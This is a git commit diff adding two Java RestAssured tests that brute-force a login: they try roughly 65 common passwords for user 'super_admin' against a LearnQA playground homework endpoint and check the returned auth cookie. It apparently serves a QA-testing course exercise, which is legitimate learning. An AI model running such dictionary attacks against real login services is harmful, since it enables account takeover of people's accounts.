57ca82a4ae9efd138a75e627e75fa2191f66588f
Максим <masaomi_kida@bk.ru>
2025-03-12 22:26:35 +0300

    HelloWorldTest

--- src/test/java/HelloWorldTest.java
+++ src/test/java/HelloWorldTest.java
@@ -6,6 +6,7 @@ import org.junit.jupiter.api.Test;
 
 
 import java.util.HashMap;
+import java.util.LinkedHashMap;
 import java.util.Map;
 
 import static org.junit.jupiter.api.Assertions.*;
@@ -175,6 +176,110 @@ public class HelloWorldTest {
             assertNotNull(finalResponse.getString("result"), "Result should not be null after completion");
             System.out.println("Job completed successfully: " + finalResponse.getString("result"));
         }
+
+    @Test
+    public void testGetSecretPass() {
+        Map<String, String> data = new LinkedHashMap<>();
+        String result = "You are NOT authorized";
+        String[] passwords = {
+                "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
+                "monkey", "111111", "1234", "1234567890", "letmein", "dragon", "baseball", "sunshine", "iloveyou",
+                "trustno1", "princess", "adobe123", "welcome", "login", "admin", "qwerty123", "1q2w3e4r", "master",
+                "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey",
+                "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*",
+                "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom",
+                "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1",
+                "000000", "123qwe"
+        };
+
+        // Map для хранения паролей (ключ - ID, значение - пароль)
+        Map<Integer, String> passwordsMap = new LinkedHashMap<>();
+
+        // Заполняем Map через forEach (с индексами)
+        int id=0; // Используем массив, чтобы передавать изменяемую переменную
+        for (String password : passwords) {
+            passwordsMap.put(id, password);
+            id++;
+        }
+        int i=0;
+        while (result.equals("You are NOT authorized") && passwordsMap.get(i) !=null){
+
+            data.put("login", "super_admin");
+            data.put("password", passwordsMap.get(i));
+            System.out.println(passwordsMap.get(i));
+            i++;
+            Response checkPassword = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+            Map<String, String> cookies = new HashMap<>();
+            String responseCookie = checkPassword.getCookie("auth_cookie");
+            System.out.println(responseCookie);
+            cookies.put("auth_cookie", responseCookie);
+            Response responseForCheck = RestAssured
+                    .given()
+                    .body(data)
+                    .cookies(cookies)
+                    .when()
+                    .post("https://playground.learnqa.ru/api/check_auth_cookie")
+                    .andReturn();
+            result = responseForCheck.print();
+
+        }
+    }
+
+    @Test
+    public void testGetSecretPassHelp() {
+        Map<String, String> data = new LinkedHashMap<>();
+        String result = "You are NOT authorized";
+        String[] passwords = {
+                "password", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
+                "monkey", "111111", "1234", "1234567890", "letmein", "dragon", "baseball", "sunshine", "iloveyou",
+                "trustno1", "princess", "adobe123", "welcome", "login", "admin", "qwerty123", "1q2w3e4r", "master",
+                "photoshop", "1qaz2wsx", "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey",
+                "access", "flower", "555555", "passw0rd", "shadow", "lovely", "7777777", "michael", "!@#$%^&*",
+                "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom",
+                "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald", "batman", "zaq1zaq1",
+                "000000", "123qwe"
+        };
+
+        int i = 0;
+        while (result.equals("You are NOT authorized") && i < passwords.length) {
+            data.put("login", "super_admin");
+            data.put("password", passwords[i]);
+
+            System.out.println("Пробуем пароль: " + passwords[i]);
+
+            Response checkPassword = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+
+            String responseCookie = checkPassword.getCookie("auth_cookie");
+
+            if (responseCookie != null) {
+                Map<String, String> cookies = new HashMap<>();
+                cookies.put("auth_cookie", responseCookie);
+
+                Response responseForCheck = RestAssured
+                        .given()
+                        .cookies(cookies)
+                        .when()
+                        .post("https://playground.learnqa.ru/api/check_auth_cookie")
+                        .andReturn();
+
+                result = responseForCheck.asString();
+            }
+
+            i++;
+        }
+
+        System.out.println("Результат: " + result);
+    }
 
 
 }
